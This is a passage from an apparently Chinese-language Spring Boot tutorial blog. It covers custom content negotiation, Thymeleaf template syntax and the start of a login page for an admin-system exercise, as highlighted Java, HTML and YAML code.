= &quot;/test/person&quot;)</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">getPerson</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">28</span>);<br>        person.setBirth(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br>        person.setUserName(<span class="hljs-string">&quot;zhangsan&quot;</span>);<br>        <span class="hljs-keyword">return</span> person;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>用Postman发送<code>/test/person</code>（请求头<code>Accept:application/x-guigu</code>)，将返回自定义协议数据的写出。</p><h2 id="42、响应处理-【源码分析】-浏览器与PostMan内容协商完全适配"><a href="#42、响应处理-【源码分析】-浏览器与PostMan内容协商完全适配" class="headerlink" title="42、响应处理-【源码分析】-浏览器与PostMan内容协商完全适配"></a>42、响应处理-【源码分析】-浏览器与PostMan内容协商完全适配</h2><p>假设你想基于自定义请求参数的自定义内容协商功能。</p><p>换句话，在地址栏输入<code>http://localhost:8080/test/person?format=gg</code>返回数据，跟<code>http://localhost:8080/test/person</code>且请求头参数<code>Accept:application/x-guigu</code>的返回自定义协议数据的一致。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> <span class="hljs-comment">/*implements WebMvcConfigurer*/</span> &#123;<br><br>    <span class="hljs-comment">//1、WebMvcConfigurer定制化SpringMVC的功能</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title function_">webMvcConfigurer</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebMvcConfigurer</span>() &#123;<br><br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 自定义内容协商策略</span><br><span class="hljs-comment">             * <span class="hljs-doctag">@param</span> configurer</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContentNegotiation</span><span class="hljs-params">(ContentNegotiationConfigurer configurer)</span> &#123;<br>                <span class="hljs-comment">//Map&lt;String, MediaType&gt; mediaTypes</span><br>                Map&lt;String, MediaType&gt; mediaTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>                mediaTypes.put(<span class="hljs-string">&quot;json&quot;</span>,MediaType.APPLICATION_JSON);<br>                mediaTypes.put(<span class="hljs-string">&quot;xml&quot;</span>,MediaType.APPLICATION_XML);<br>                <span class="hljs-comment">//自定义媒体类型</span><br>                mediaTypes.put(<span class="hljs-string">&quot;gg&quot;</span>,MediaType.parseMediaType(<span class="hljs-string">&quot;application/x-guigu&quot;</span>));<br>                <span class="hljs-comment">//指定支持解析哪些参数对应的哪些媒体类型</span><br>                <span class="hljs-type">ParameterContentNegotiationStrategy</span> <span class="hljs-variable">parameterStrategy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParameterContentNegotiationStrategy</span>(mediaTypes);<br><span class="hljs-comment">//                parameterStrategy.setParameterName(&quot;ff&quot;);</span><br><br>                <span class="hljs-comment">//还需添加请求头处理策略，否则accept:application/json、application/xml则会失效</span><br>                <span class="hljs-type">HeaderContentNegotiationStrategy</span> <span class="hljs-variable">headeStrategy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeaderContentNegotiationStrategy</span>();<br><br>                configurer.strategies(Arrays.asList(parameterStrategy, headeStrategy));<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>日后开发要注意，<strong>有可能我们添加的自定义的功能会覆盖默认很多功能，导致一些默认的功能失效。</strong></p><h2 id="43、视图解析-Thymeleaf初体验"><a href="#43、视图解析-Thymeleaf初体验" class="headerlink" title="43、视图解析-Thymeleaf初体验"></a>43、视图解析-Thymeleaf初体验</h2><blockquote><p><strong>Thymeleaf</strong> is a modern server-side Java template engine for both web and standalone environments.</p><p>Thymeleaf’s main goal is to bring elegant <em>natural templates</em> to your development workflow — HTML that can be correctly displayed in browsers and also work as static prototypes, allowing for stronger collaboration in development teams.</p><p>With modules for Spring Framework, a host of integrations with your favourite tools, and the ability to plug in your own functionality, Thymeleaf is ideal for modern-day HTML5 JVM web development — although there is much more it can do.——<a href="https://www.thymeleaf.org/">Link</a></p></blockquote><p><a href="https://www.thymeleaf.org/documentation.html">Thymeleaf官方文档</a></p><h3 id="thymeleaf使用"><a href="#thymeleaf使用" class="headerlink" title="thymeleaf使用"></a>thymeleaf使用</h3><h4 id="引入Starter"><a href="#引入Starter" class="headerlink" title="引入Starter"></a>引入Starter</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="自动配置好了thymeleaf"><a href="#自动配置好了thymeleaf" class="headerlink" title="自动配置好了thymeleaf"></a>自动配置好了thymeleaf</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@EnableConfigurationProperties(ThymeleafProperties.class)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; TemplateMode.class, SpringTemplateEngine.class &#125;)</span><br><span class="hljs-meta">@AutoConfigureAfter(&#123; WebMvcAutoConfiguration.class, WebFluxAutoConfiguration.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThymeleafAutoConfiguration</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>自动配好的策略</p><ol><li><p>所有thymeleaf的配置值都在 ThymeleafProperties</p></li><li><p>配置好了 <strong>SpringTemplateEngine</strong> </p></li><li><p>配好了 <strong>ThymeleafViewResolver</strong> </p></li><li><p>我们只需要直接开发页面</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;classpath:/templates/&quot;</span>;<span class="hljs-comment">//模板放置处</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SUFFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.html&quot;</span>;<span class="hljs-comment">//文件的后缀名</span><br></code></pre></td></tr></table></figure><p>编写一个控制层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewTestController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">(Model model)</span>&#123;<br>        <span class="hljs-comment">//model中的数据会被放在请求域中 request.setAttribute(&quot;a&quot;,aa)</span><br>        model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;一定要大力发展工业文化&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;link&quot;</span>,<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>/templates/success.html</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span>nice<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;www.baidu.com&quot;</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;$&#123;link&#125;&quot;</span>&gt;</span>去百度<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;www.google.com&quot;</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/link&#125;&quot;</span>&gt;</span>去百度<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">servlet:</span><br>    <span class="hljs-attr">context-path:</span> <span class="hljs-string">/app</span> <span class="hljs-comment">#设置应用名</span><br></code></pre></td></tr></table></figure><p>这个设置后，URL要插入<code>/app</code>,  如<code>http://localhost:8080/app/hello.html</code>。</p><h3 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h3><h4 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h4><table><thead><tr><th>表达式名字</th><th>语法</th><th align="center">用途</th></tr></thead><tbody><tr><td>变量取值</td><td>${…}</td><td align="center">获取请求域、session域、对象等值</td></tr><tr><td>选择变量</td><td>*{…}</td><td align="center">获取上下文对象值</td></tr><tr><td>消息</td><td>#{…}</td><td align="center">获取国际化等值</td></tr><tr><td>链接</td><td>@{…}</td><td align="center">生成链接</td></tr><tr><td>片段表达式</td><td>~{…}</td><td align="center">jsp:include 作用，引入公共页面片段</td></tr></tbody></table><h4 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h4><ul><li>文本值: <strong>‘one text’</strong> <strong>,</strong> <strong>‘Another one!’</strong> <strong>,…</strong></li><li>数字: <strong>0</strong> <strong>,</strong> <strong>34</strong> <strong>,</strong> <strong>3.0</strong> <strong>,</strong> <strong>12.3</strong> <strong>,…</strong></li><li>布尔值: <strong>true</strong> <strong>,</strong> <strong>false</strong></li><li>空值: <strong>null</strong></li><li>变量： one，two，…. 变量不能有空格</li></ul><h4 id="文本操作"><a href="#文本操作" class="headerlink" title="文本操作"></a>文本操作</h4><ul><li>字符串拼接: <strong>+</strong></li><li>变量替换: <strong>|The name is ${name}|</strong></li></ul><h4 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h4><ul><li>运算符: + , - , * , &#x2F; , %</li></ul><h4 id="布尔运算"><a href="#布尔运算" class="headerlink" title="布尔运算"></a>布尔运算</h4><ul><li>运算符:  <strong>and</strong> <strong>,</strong> <strong>or</strong></li><li>一元运算: <strong>!</strong> <strong>,</strong> <strong>not</strong></li></ul><h4 id="比较运算"><a href="#比较运算" class="headerlink" title="比较运算"></a>比较运算</h4><ul><li>比较: <strong>&gt;</strong> <strong>,</strong> <strong>&lt;** **,** **&gt;&#x3D;</strong> <strong>,</strong> <strong>&lt;&#x3D;</strong> <strong>(</strong> <strong>gt</strong> <strong>,</strong> <strong>lt</strong> <strong>,</strong> <strong>ge</strong> <strong>,</strong> <strong>le</strong> <strong>)</strong></li><li>等式: <strong>&#x3D;&#x3D;</strong> <strong>,</strong> <strong>!&#x3D;</strong> <strong>(</strong> <strong>eq</strong> <strong>,</strong> <strong>ne</strong> <strong>)</strong></li></ul><h4 id="条件运算"><a href="#条件运算" class="headerlink" title="条件运算"></a>条件运算</h4><ul><li>If-then: <strong>(if) ? (then)</strong></li><li>If-then-else: <strong>(if) ? (then) : (else)</strong></li><li>Default: (value) <strong>?: (defaultvalue)</strong></li></ul><h4 id="特殊操作"><a href="#特殊操作" class="headerlink" title="特殊操作"></a>特殊操作</h4><ul><li>无操作： _</li></ul><h3 id="设置属性值-th-attr"><a href="#设置属性值-th-attr" class="headerlink" title="设置属性值-th:attr"></a>设置属性值-th:attr</h3><ul><li>设置单个值</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;subscribe.html&quot;</span> <span class="hljs-attr">th:attr</span>=<span class="hljs-string">&quot;action=@&#123;/subscribe&#125;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Subscribe!&quot;</span> <span class="hljs-attr">th:attr</span>=<span class="hljs-string">&quot;value=#&#123;subscribe.submit&#125;&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">fieldset</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>设置多个值</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../images/gtvglogo.png&quot;</span>  </span><br><span class="hljs-tag">     <span class="hljs-attr">th:attr</span>=<span class="hljs-string">&quot;src=@&#123;/images/gtvglogo.png&#125;,title=#&#123;logo&#125;,alt=#&#123;logo&#125;&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#setting-attribute-values">官方文档 - 5 Setting Attribute Values</a></p><h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;prod : $&#123;prods&#125;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.name&#125;&quot;</span>&gt;</span>Onions<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.price&#125;&quot;</span>&gt;</span>2.41<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.inStock&#125;? #&#123;true&#125; : #&#123;false&#125;&quot;</span>&gt;</span>yes<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;prod,iterStat : $&#123;prods&#125;&quot;</span> <span class="hljs-attr">th:class</span>=<span class="hljs-string">&quot;$&#123;iterStat.odd&#125;? &#x27;odd&#x27;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.name&#125;&quot;</span>&gt;</span>Onions<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.price&#125;&quot;</span>&gt;</span>2.41<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.inStock&#125;? #&#123;true&#125; : #&#123;false&#125;&quot;</span>&gt;</span>yes<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="条件运算-1"><a href="#条件运算-1" class="headerlink" title="条件运算"></a>条件运算</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;comments.html&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/product/comments(prodId=$&#123;prod.id&#125;)&#125;&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">th:if</span>=<span class="hljs-string">&quot;$&#123;not #lists.isEmpty(prod.comments)&#125;&quot;</span>&gt;</span>view<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:switch</span>=<span class="hljs-string">&quot;$&#123;user.role&#125;&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">th:case</span>=<span class="hljs-string">&quot;&#x27;admin&#x27;&quot;</span>&gt;</span>User is an administrator<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">th:case</span>=<span class="hljs-string">&quot;#&#123;roles.manager&#125;&quot;</span>&gt;</span>User is a manager<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">th:case</span>=<span class="hljs-string">&quot;*&quot;</span>&gt;</span>User is some other thing<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="属性优先级"><a href="#属性优先级" class="headerlink" title="属性优先级"></a>属性优先级</h3><table><thead><tr><th align="left">Order</th><th align="left">Feature</th><th align="left">Attributes</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">Fragment inclusion</td><td align="left"><code>th:insert</code> <code>th:replace</code></td></tr><tr><td align="left">2</td><td align="left">Fragment iteration</td><td align="left"><code>th:each</code></td></tr><tr><td align="left">3</td><td align="left">Conditional evaluation</td><td align="left"><code>th:if</code> <code>th:unless</code> <code>th:switch</code> <code>th:case</code></td></tr><tr><td align="left">4</td><td align="left">Local variable definition</td><td align="left"><code>th:object</code> <code>th:with</code></td></tr><tr><td align="left">5</td><td align="left">General attribute modification</td><td align="left"><code>th:attr</code> <code>th:attrprepend</code> <code>th:attrappend</code></td></tr><tr><td align="left">6</td><td align="left">Specific attribute modification</td><td align="left"><code>th:value</code> <code>th:href</code> <code>th:src</code> <code>...</code></td></tr><tr><td align="left">7</td><td align="left">Text (tag body modification)</td><td align="left"><code>th:text</code> <code>th:utext</code></td></tr><tr><td align="left">8</td><td align="left">Fragment specification</td><td align="left"><code>th:fragment</code></td></tr><tr><td align="left">9</td><td align="left">Fragment removal</td><td align="left"><code>th:remove</code></td></tr></tbody></table><p><a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#attribute-precedence">官方文档 - 10 Attribute Precedence</a></p><h2 id="44、web实验-后台管理系统基本功能"><a href="#44、web实验-后台管理系统基本功能" class="headerlink" title="44、web实验-后台管理系统基本功能"></a>44、web实验-后台管理系统基本功能</h2><h3 id="项目创建"><a href="#项目创建" class="headerlink" title="项目创建"></a>项目创建</h3><p>使用IDEA的Spring Initializr。</p><ul><li>thymeleaf、</li><li>web-starter、</li><li>devtools、</li><li>lombok</li></ul><h3 id="登陆页面"><a href="#登陆页面" class="headerlink" title="登陆页面"></a>登陆页面</h3><ul><li><p><code>/static</code> 放置 css，js等静态资源</p></li><li><p><code>/templates/login.html</code> 登录页</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 要加这玩意thymeleaf才能用 --&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-signin&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;index.html&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">th:action</span>=<span class="hljs-string">&quot;@&#123;/login&#125;&quot;</span>&gt;</span><br><br>    ...<br>    <br>    <span class="hljs-comment">&lt;!-- 消息提醒 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: red&quot;</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userName&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;User ID&quot;</span> <span class="hljs-attr">autofocus</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Password&quot;</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-lg btn-login btn-block&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-check&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <br>    ...<br>    <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>/templates/main.html</code> 主页</li></ul><p>thymeleaf内联写法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello, [[$&#123;session.user.name&#125;]]!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="登录控制层"><a href="#登录控制层" class="headerlink" title="登录控制层"></a>登录控制层</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 